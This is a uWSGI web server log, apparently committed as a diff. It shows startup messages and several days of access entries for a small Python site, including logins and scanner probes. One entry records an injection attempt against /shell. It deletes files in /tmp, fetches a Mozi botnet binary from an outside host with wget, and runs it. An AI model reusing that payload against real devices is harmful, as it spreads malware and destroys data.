+os: Linux-4.4.0-173-generic #203-Ubuntu SMP Wed Jan 15 02:55:01 UTC 2020
+nodename: iZuf65k4ho3tbe76g8ory6Z
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/big_data_web
+writing pidfile to uwsgi.pid
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/big_data_web/
+your processes number limit is 7829
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 0.0.0.0:8888 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Oct  8 2019, 13:06:37)  [GCC 5.4.0 20160609]
+Set PythonHome to /root/.virtualenvs/big_data
+Python main interpreter initialized at 0xc08180
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 416720 bytes (406 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0xc08180 pid: 1767 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1767)
+spawned uWSGI worker 1 (pid: 1769, cores: 2)
+spawned uWSGI worker 2 (pid: 1770, cores: 2)
+spawned uWSGI worker 3 (pid: 1771, cores: 2)
+spawned uWSGI worker 4 (pid: 1772, cores: 2)
+[pid: 1769|app: 0|req: 1/1] 122.96.42.165 () {48 vars in 844 bytes} [Wed Feb  5 13:12:48 2020] GET / => generated 0 bytes in 49 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 0)
+[pid: 1769|app: 0|req: 2/2] 122.96.42.165 () {44 vars in 763 bytes} [Wed Feb  5 13:12:48 2020] GET /login/ => generated 1121 bytes in 45 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
+[pid: 1769|app: 0|req: 3/3] 122.96.42.165 () {52 vars in 954 bytes} [Wed Feb  5 13:12:54 2020] POST /login/ => generated 0 bytes in 40 msecs (HTTP/1.1 302) 5 headers in 201 bytes (1 switches on core 0)
+[pid: 1769|app: 0|req: 4/4] 122.96.42.165 () {48 vars in 868 bytes} [Wed Feb  5 13:12:54 2020] GET /main/ => generated 50054 bytes in 8 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 1)
+[pid: 1769|app: 0|req: 5/5] 122.96.42.165 () {46 vars in 832 bytes} [Wed Feb  5 13:15:23 2020] GET /dp/ => generated 4277 bytes in 4 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+[pid: 1769|app: 0|req: 6/6] 47.240.89.111 () {30 vars in 326 bytes} [Wed Feb  5 14:02:01 2020] HEAD / => generated 0 bytes in 6 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 1)
+[pid: 1770|app: 0|req: 1/7] 47.240.89.111 () {30 vars in 325 bytes} [Wed Feb  5 14:02:01 2020] HEAD / => generated 0 bytes in 21 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 0)
+invalid request block size: 16709 (max 4096)...skip
+invalid request block size: 16709 (max 4096)...skip
+[pid: 1769|app: 0|req: 7/8] 80.78.65.147 () {32 vars in 449 bytes} [Wed Feb  5 14:04:37 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 1)
+[pid: 1770|app: 0|req: 2/9] 187.110.208.140 () {32 vars in 452 bytes} [Wed Feb  5 14:51:58 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 1)
+invalid request block size: 21327 (max 4096)...skip
+invalid request block size: 20047 (max 4096)...skip
+[pid: 1771|app: 0|req: 1/10] 119.61.6.135 () {28 vars in 296 bytes} [Wed Feb  5 15:11:25 2020] GET / => generated 0 bytes in 15 msecs (HTTP/1.0 302) 4 headers in 129 bytes (1 switches on core 0)
+-- unavailable modifier requested: 4 --
+[pid: 1769|app: 0|req: 8/12] 119.61.6.134 () {38 vars in 614 bytes} [Wed Feb  5 15:12:08 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 0)
+[pid: 1772|app: 0|req: 1/13] 119.61.6.134 () {38 vars in 626 bytes} [Wed Feb  5 15:12:08 2020] GET /login/ => generated 1121 bytes in 31 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+[pid: 1771|app: 0|req: 2/14] 101.224.181.113 () {48 vars in 895 bytes} [Wed Feb  5 15:12:28 2020] GET / => generated 4277 bytes in 15 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
+[pid: 1772|app: 0|req: 2/15] 101.224.181.113 () {44 vars in 817 bytes} [Wed Feb  5 15:25:13 2020] GET /main/ => generated 50054 bytes in 7 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 1)
+[pid: 1770|app: 0|req: 3/16] 101.224.181.113 () {44 vars in 818 bytes} [Wed Feb  5 15:27:11 2020] GET /dp/ => generated 4277 bytes in 18 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
+[pid: 1769|app: 0|req: 9/17] 177.102.17.220 () {32 vars in 451 bytes} [Wed Feb  5 15:43:44 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 0)
+[pid: 1772|app: 0|req: 3/18] 177.102.17.220 () {32 vars in 458 bytes} [Wed Feb  5 15:43:45 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 0)
+[pid: 1772|app: 0|req: 4/19] 101.224.181.113 () {44 vars in 802 bytes} [Wed Feb  5 16:06:58 2020] GET / => generated 4277 bytes in 3 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
+[pid: 1769|app: 0|req: 10/20] 101.224.181.113 () {44 vars in 817 bytes} [Wed Feb  5 16:07:00 2020] GET /main/ => generated 50054 bytes in 3 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 0)
+[pid: 1769|app: 0|req: 11/21] 71.6.232.4 () {34 vars in 471 bytes} [Wed Feb  5 16:30:31 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 1)
+[pid: 1769|app: 0|req: 12/22] 2.187.7.160 () {32 vars in 448 bytes} [Wed Feb  5 16:40:24 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 1)
+-- unavailable modifier requested: 3 --
+[pid: 1769|app: 0|req: 13/24] 112.96.180.97 () {44 vars in 817 bytes} [Wed Feb  5 16:59:03 2020] GET /dp/ => generated 4277 bytes in 2 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+[pid: 1769|app: 0|req: 14/25] 112.96.180.97 () {46 vars in 848 bytes} [Wed Feb  5 16:59:20 2020] GET /dp/ => generated 4277 bytes in 4 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
+[pid: 1769|app: 0|req: 15/26] 112.96.180.97 () {44 vars in 819 bytes} [Wed Feb  5 16:59:46 2020] GET /main/ => generated 50054 bytes in 3 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 0)
+[pid: 1771|app: 0|req: 3/27] 112.96.180.97 () {44 vars in 817 bytes} [Wed Feb  5 17:00:04 2020] GET /dp/ => generated 4277 bytes in 2 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+[pid: 1769|app: 0|req: 16/28] 112.96.180.97 () {44 vars in 819 bytes} [Wed Feb  5 17:05:18 2020] GET /main/ => generated 50054 bytes in 3 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 1)
+[pid: 1771|app: 0|req: 4/29] 36.82.127.128 () {32 vars in 457 bytes} [Wed Feb  5 18:23:04 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 1)
+[pid: 1769|app: 0|req: 17/30] 63.143.35.226 () {26 vars in 290 bytes} [Wed Feb  5 18:58:19 2020] HEAD /robots.txt => generated 26 bytes in 137 msecs (HTTP/1.0 400) 1 headers in 53 bytes (1 switches on core 0)
+[pid: 1769|app: 0|req: 18/31] 112.96.180.97 () {46 vars in 848 bytes} [Wed Feb  5 19:09:23 2020] GET /dp/ => generated 4277 bytes in 2 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
+invalid request block size: 21327 (max 4096)...skip
+invalid request block size: 20047 (max 4096)...skip
+-- unavailable modifier requested: 4 --
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 16709 (max 4096)...skip
+[pid: 1769|app: 0|req: 19/33] 139.162.88.63 () {32 vars in 408 bytes} [Wed Feb  5 19:42:07 2020] GET /echo.php?info=1234567890 => generated 77 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 100 bytes (1 switches on core 1)
+[pid: 1769|app: 0|req: 20/34] 119.23.224.131 () {34 vars in 453 bytes} [Wed Feb  5 19:57:31 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 0)
+[pid: 1769|app: 0|req: 21/35] 128.14.134.170 () {34 vars in 475 bytes} [Wed Feb  5 20:00:03 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 1)
+[pid: 1769|app: 0|req: 22/36] 128.14.134.170 () {36 vars in 523 bytes} [Wed Feb  5 20:00:03 2020] GET /login/ => generated 1121 bytes in 2 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+invalid request block size: 21573 (max 4096)...skip
+[pid: 1769|app: 0|req: 23/37] 122.194.0.197 () {42 vars in 715 bytes} [Wed Feb  5 20:24:48 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 1)
+[pid: 1772|app: 0|req: 5/38] 122.194.0.197 () {42 vars in 727 bytes} [Wed Feb  5 20:24:48 2020] GET /login/ => generated 1121 bytes in 2 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+[pid: 1772|app: 0|req: 6/39] 122.194.0.197 () {42 vars in 665 bytes} [Wed Feb  5 20:24:49 2020] GET /favicon.ico => generated 77 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 100 bytes (1 switches on core 1)
+[pid: 1769|app: 0|req: 24/40] 122.194.0.197 () {52 vars in 949 bytes} [Wed Feb  5 20:24:54 2020] POST /login/ => generated 0 bytes in 5 msecs (HTTP/1.1 302) 5 headers in 201 bytes (1 switches on core 0)
+[pid: 1769|app: 0|req: 25/41] 122.194.0.197 () {48 vars in 863 bytes} [Wed Feb  5 20:24:54 2020] GET /main/ => generated 50054 bytes in 3 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 1)
+[pid: 1769|app: 0|req: 26/42] 5.202.147.206 () {32 vars in 451 bytes} [Wed Feb  5 20:27:58 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 0)
+invalid request block size: 16709 (max 4096)...skip
+invalid request block size: 16709 (max 4096)...skip
+[pid: 1769|app: 0|req: 27/43] 47.240.89.111 () {30 vars in 325 bytes} [Wed Feb  5 20:39:42 2020] HEAD / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 1)
+[pid: 1772|app: 0|req: 7/44] 47.240.89.111 () {30 vars in 326 bytes} [Wed Feb  5 20:39:42 2020] HEAD / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 0)
+[pid: 1769|app: 0|req: 28/45] 122.194.0.197 () {48 vars in 863 bytes} [Wed Feb  5 20:42:31 2020] GET /main/ => generated 50054 bytes in 3 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 1)
+[pid: 1769|app: 0|req: 29/46] 113.25.47.110 () {34 vars in 635 bytes} [Wed Feb  5 20:45:53 2020] GET /shell?cd+/tmp;rm+-rf+*;wget+http://113.25.47.110:40411/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws => generated 77 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 100 bytes (1 switches on core 0)
+[pid: 1769|app: 0|req: 30/47] 188.134.75.248 () {32 vars in 451 bytes} [Wed Feb  5 21:43:52 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 1)
+[pid: 1769|app: 0|req: 31/48] 80.82.70.187 () {32 vars in 421 bytes} [Wed Feb  5 21:51:42 2020] GET /cache/global/img/gs.gif => generated 77 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 100 bytes (1 switches on core 0)
+[pid: 1769|app: 0|req: 32/49] 108.61.132.118 () {38 vars in 573 bytes} [Wed Feb  5 22:41:11 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 1)
+invalid request block size: 21327 (max 4096)...skip
+invalid request block size: 20047 (max 4096)...skip
+-- unavailable modifier requested: 4 --
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+[pid: 1769|app: 0|req: 33/51] 77.30.212.157 () {32 vars in 450 bytes} [Thu Feb  6 01:18:30 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 0)
+[pid: 1769|app: 0|req: 34/52] 162.243.129.152 () {34 vars in 382 bytes} [Thu Feb  6 01:26:50 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 1)
+invalid request block size: 21573 (max 4096)...skip
+[pid: 1769|app: 0|req: 35/53] 47.100.64.86 () {26 vars in 268 bytes} [Thu Feb  6 02:41:19 2020] GET / => generated 26 bytes in 12 msecs (HTTP/1.0 400) 1 headers in 53 bytes (1 switches on core 0)
+-- unavailable modifier requested: 3 --
+invalid request block size: 21327 (max 4096)...skip
+invalid request block size: 20047 (max 4096)...skip
+-- unavailable modifier requested: 4 --
+[pid: 1769|app: 0|req: 36/56] 5.8.10.202 () {30 vars in 321 bytes} [Thu Feb  6 03:32:18 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 1)
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 20047 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+[pid: 1769|app: 0|req: 37/57] 202.166.220.213 () {32 vars in 452 bytes} [Thu Feb  6 06:08:17 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 0)
+[pid: 1769|app: 0|req: 38/58] 109.66.2.146 () {28 vars in 293 bytes} [Thu Feb  6 06:43:35 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 1)
+-- unavailable modifier requested: 3 --
+invalid request block size: 21327 (max 4096)...skip
+invalid request block size: 20047 (max 4096)...skip
+-- unavailable modifier requested: 4 --
+[pid: 1769|app: 0|req: 39/61] 80.82.70.187 () {32 vars in 421 bytes} [Thu Feb  6 07:30:39 2020] GET /cache/global/img/gs.gif => generated 77 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 100 bytes (1 switches on core 0)
+invalid request block size: 16709 (max 4096)...skip
+[pid: 1769|app: 0|req: 40/62] 80.232.222.78 () {32 vars in 457 bytes} [Thu Feb  6 08:39:36 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 1)
+[pid: 1769|app: 0|req: 41/63] 75.129.10.90 () {28 vars in 293 bytes} [Thu Feb  6 08:55:47 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 1)
+[pid: 1769|app: 0|req: 42/64] 93.174.93.31 () {34 vars in 388 bytes} [Thu Feb  6 09:11:55 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 0)
+[pid: 1770|app: 0|req: 4/65] 93.174.93.31 () {34 vars in 400 bytes} [Thu Feb  6 09:11:56 2020] GET /login/ => generated 1121 bytes in 3 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+invalid request block size: 16709 (max 4096)...skip
+invalid request block size: 16709 (max 4096)...skip
+[pid: 1769|app: 0|req: 43/66] 47.240.89.111 () {30 vars in 326 bytes} [Thu Feb  6 09:32:07 2020] HEAD / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 0)
+[pid: 1772|app: 0|req: 8/67] 47.240.89.111 () {30 vars in 325 bytes} [Thu Feb  6 09:32:07 2020] HEAD / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 0)
+invalid request block size: 21573 (max 4096)...skip
+[pid: 1772|app: 0|req: 9/68] 186.227.144.18 () {32 vars in 452 bytes} [Thu Feb  6 10:36:54 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 1)
+[pid: 1769|app: 0|req: 44/69] 94.102.51.27 () {34 vars in 388 bytes} [Thu Feb  6 10:43:12 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 0)
+[pid: 1772|app: 0|req: 10/70] 94.102.51.27 () {34 vars in 400 bytes} [Thu Feb  6 10:43:12 2020] GET /login/ => generated 1121 bytes in 2 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+invalid request block size: 21327 (max 4096)...skip
+invalid request block size: 20047 (max 4096)...skip
+-- unavailable modifier requested: 4 --
+invalid request block size: 16709 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+[pid: 1772|app: 0|req: 11/72] 106.15.76.85 () {26 vars in 268 bytes} [Thu Feb  6 12:04:51 2020] GET / => generated 26 bytes in 38 msecs (HTTP/1.0 400) 1 headers in 53 bytes (1 switches on core 1)
+invalid request block size: 21573 (max 4096)...skip
+[pid: 1769|app: 0|req: 45/73] 108.61.132.118 () {38 vars in 486 bytes} [Thu Feb  6 13:37:30 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 0)
+invalid request block size: 16709 (max 4096)...skip
+invalid request block size: 16709 (max 4096)...skip
+[pid: 1769|app: 0|req: 46/74] 47.240.89.111 () {30 vars in 325 bytes} [Thu Feb  6 13:40:02 2020] HEAD / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 0)
+[pid: 1772|app: 0|req: 12/75] 47.240.89.111 () {30 vars in 326 bytes} [Thu Feb  6 13:40:02 2020] HEAD / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 0)
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21327 (max 4096)...skip
+invalid request block size: 20047 (max 4096)...skip
+-- unavailable modifier requested: 4 --
+[pid: 1769|app: 0|req: 47/77] 103.146.232.2 () {32 vars in 457 bytes} [Thu Feb  6 15:13:07 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 0)
+[pid: 1769|app: 0|req: 48/78] 161.22.27.237 () {32 vars in 450 bytes} [Thu Feb  6 15:23:55 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 1)
+invalid request block size: 21573 (max 4096)...skip
+[pid: 1769|app: 0|req: 49/79] 120.55.13.109 () {26 vars in 269 bytes} [Thu Feb  6 15:38:16 2020] GET / => generated 26 bytes in 12 msecs (HTTP/1.0 400) 1 headers in 53 bytes (1 switches on core 0)
+[pid: 1769|app: 0|req: 50/80] 80.82.70.187 () {32 vars in 421 bytes} [Thu Feb  6 17:09:14 2020] GET /cache/global/img/gs.gif => generated 77 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 100 bytes (1 switches on core 1)
+invalid request block size: 16709 (max 4096)...skip
+invalid request block size: 16709 (max 4096)...skip
+[pid: 1772|app: 0|req: 13/81] 47.240.89.111 () {30 vars in 326 bytes} [Thu Feb  6 17:14:25 2020] HEAD / => generated 0 bytes in 2 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 0)
+[pid: 1770|app: 0|req: 5/82] 47.240.89.111 () {30 vars in 325 bytes} [Thu Feb  6 17:14:25 2020] HEAD / => generated 0 bytes in 3 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 1)
+invalid request block size: 21573 (max 4096)...skip
+[pid: 1772|app: 0|req: 14/83] 51.77.110.48 () {26 vars in 289 bytes} [Thu Feb  6 19:05:55 2020] HEAD /robots.txt => generated 26 bytes in 48 msecs (HTTP/1.0 400) 1 headers in 53 bytes (1 switches on core 1)
+invalid request block size: 21327 (max 4096)...skip
+invalid request block size: 20047 (max 4096)...skip
+-- unavailable modifier requested: 4 --
+uwsgi_proto_uwsgi_parser(): Success [proto/uwsgi.c line 40]
+[pid: 1769|app: 0|req: 51/85] 78.166.52.32 () {32 vars in 449 bytes} [Thu Feb  6 20:13:48 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 1)
+-- unavailable modifier requested: 3 --
+-- unavailable modifier requested: 3 --
+[pid: 1770|app: 0|req: 6/88] 80.104.178.151 () {32 vars in 452 bytes} [Thu Feb  6 20:58:31 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 1)
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+[pid: 1769|app: 0|req: 52/89] 38.68.36.214 () {30 vars in 322 bytes} [Thu Feb  6 23:05:55 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 0)
+[pid: 1769|app: 0|req: 53/90] 38.68.36.214 () {28 vars in 305 bytes} [Thu Feb  6 23:05:55 2020] GET /login/ => generated 1121 bytes in 2 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
+invalid request block size: 21327 (max 4096)...skip
+invalid request block size: 20047 (max 4096)...skip
+-- unavailable modifier requested: 4 --
+invalid request block size: 16709 (max 4096)...skip
+[pid: 1769|app: 0|req: 54/92] 187.162.89.164 () {26 vars in 269 bytes} [Fri Feb  7 00:09:03 2020] GET / => generated 26 bytes in 12 msecs (HTTP/1.0 400) 1 headers in 53 bytes (1 switches on core 1)
+[pid: 1769|app: 0|req: 55/93] 47.94.39.226 () {26 vars in 268 bytes} [Fri Feb  7 00:31:48 2020] GET / => generated 26 bytes in 12 msecs (HTTP/1.0 400) 1 headers in 53 bytes (1 switches on core 0)
+invalid request block size: 21573 (max 4096)...skip
+[pid: 1769|app: 0|req: 56/94] 80.82.70.187 () {32 vars in 421 bytes} [Fri Feb  7 02:50:45 2020] GET /cache/global/img/gs.gif => generated 77 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 100 bytes (1 switches on core 1)
+[pid: 1769|app: 0|req: 57/95] 83.97.20.34 () {26 vars in 266 bytes} [Fri Feb  7 03:05:12 2020] GET / => generated 26 bytes in 11 msecs (HTTP/1.0 400) 1 headers in 53 bytes (1 switches on core 0)
+invalid request block size: 21327 (max 4096)...skip
+invalid request block size: 20047 (max 4096)...skip
+-- unavailable modifier requested: 4 --
+[pid: 1769|app: 0|req: 58/97] 47.97.21.76 () {26 vars in 267 bytes} [Fri Feb  7 04:35:22 2020] GET / => generated 26 bytes in 12 msecs (HTTP/1.0 400) 1 headers in 53 bytes (1 switches on core 0)
+[pid: 1769|app: 0|req: 59/98] 186.59.73.119 () {26 vars in 268 bytes} [Fri Feb  7 04:39:32 2020] GET / => generated 26 bytes in 13 msecs (HTTP/1.0 400) 1 headers in 53 bytes (1 switches on core 1)
+invalid request block size: 21573 (max 4096)...skip
+[pid: 1769|app: 0|req: 60/99] 96.126.103.73 () {34 vars in 469 bytes} [Fri Feb  7 05:14:30 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 0)
+[pid: 1770|app: 0|req: 7/100] 96.126.103.73 () {36 vars in 517 bytes} [Fri Feb  7 05:14:30 2020] GET /login/ => generated 1121 bytes in 2 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+[pid: 1769|app: 0|req: 61/101] 106.14.177.124 () {34 vars in 447 bytes} [Fri Feb  7 06:40:42 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 1)
+[pid: 1772|app: 0|req: 15/102] 106.14.177.124 () {34 vars in 459 bytes} [Fri Feb  7 06:40:42 2020] GET /login/ => generated 1121 bytes in 2 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+invalid request block size: 21327 (max 4096)...skip
+invalid request block size: 20047 (max 4096)...skip
+-- unavailable modifier requested: 4 --
+invalid request block size: 16709 (max 4096)...skip
+[pid: 1770|app: 0|req: 8/104] 189.90.118.232 () {32 vars in 452 bytes} [Fri Feb  7 07:57:59 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 1)
+[pid: 1770|app: 0|req: 9/105] 196.52.43.62 () {30 vars in 408 bytes} [Fri Feb  7 08:10:00 2020] GET / => generated 26 bytes in 39 msecs (HTTP/1.0 400) 1 headers in 53 bytes (1 switches on core 1)
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+[pid: 1769|app: 0|req: 62/106] 169.197.108.6 () {34 vars in 474 bytes} [Fri Feb  7 09:32:49 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 0)
+invalid request block size: 21573 (max 4096)...skip
+-- unavailable modifier requested: 3 --
+[pid: 1769|app: 0|req: 63/108] 208.115.198.2 () {26 vars in 290 bytes} [Fri Feb  7 10:23:44 2020] HEAD /robots.txt => generated 26 bytes in 13 msecs (HTTP/1.0 400) 1 headers in 53 bytes (1 switches on core 1)
+[pid: 1769|app: 0|req: 64/109] 5.188.210.101 () {46 vars in 651 bytes} [Fri Feb  7 10:28:37 2020] GET /echo.php => generated 77 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 100 bytes (1 switches on core 0)
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21327 (max 4096)...skip
+invalid request block size: 20047 (max 4096)...skip
+-- unavailable modifier requested: 4 --
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+[pid: 1769|app: 0|req: 65/111] 45.183.208.12 () {32 vars in 451 bytes} [Fri Feb  7 12:21:38 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 0)
+[pid: 1769|app: 0|req: 66/112] 80.82.70.187 () {32 vars in 421 bytes} [Fri Feb  7 12:32:38 2020] GET /cache/global/img/gs.gif => generated 77 bytes in 2 msecs (HTTP/1.1 404) 3 headers in 100 bytes (1 switches on core 1)
+[pid: 1769|app: 0|req: 67/113] 122.96.47.136 () {42 vars in 721 bytes} [Fri Feb  7 13:40:12 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 0)
+[pid: 1770|app: 0|req: 10/114] 122.96.47.136 () {42 vars in 733 bytes} [Fri Feb  7 13:40:12 2020] GET /login/ => generated 1121 bytes in 2 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+[pid: 1769|app: 0|req: 68/115] 122.96.47.136 () {42 vars in 671 bytes} [Fri Feb  7 13:40:12 2020] GET /favicon.ico => generated 77 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 100 bytes (1 switches on core 1)
+[pid: 1769|app: 0|req: 69/116] 219.152.218.45 () {40 vars in 880 bytes} [Fri Feb  7 13:42:01 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 1)
+[pid: 1772|app: 0|req: 16/117] 219.152.218.45 () {40 vars in 892 bytes} [Fri Feb  7 13:42:01 2020] GET /login/ => generated 1121 bytes in 2 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+[pid: 1772|app: 0|req: 17/118] 210.22.245.219 () {36 vars in 543 bytes} [Fri Feb  7 13:42:06 2020] GET / => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 129 bytes (1 switches on core 1)
+[pid: 1770|app: 0|req: 11/119] 219.152.218.45 () {40 vars in 852 bytes} [Fri Feb  7 13:42:12 2020] GET /favicon.ico => generated 77 bytes in 1 msecs (HTTP/1.1 404) 3 headers in 100 bytes (1 switches on core 1)
